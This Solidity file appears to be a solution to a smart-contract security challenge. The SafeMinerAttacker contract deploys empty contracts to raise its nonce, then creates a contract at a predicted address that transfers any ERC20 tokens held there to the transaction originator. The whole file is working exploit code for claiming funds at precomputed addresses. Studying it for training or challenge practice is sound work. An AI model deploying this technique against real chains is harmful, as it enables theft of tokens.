// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC20.sol";

contract SafeMinerAttacker {
    constructor(
        IERC20 token,
        uint256 count
    ) 
    {
        for (uint256 i; i < count-1; i++) {
            new EmptyContract();
        }
        new TranToken(token);
    }
}

contract EmptyContract {
    // empty contract to increase the nonce in a cheap way
}

contract TranToken {
    constructor(IERC20 token) {
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.transfer(tx.origin, balance);
        }
    }
}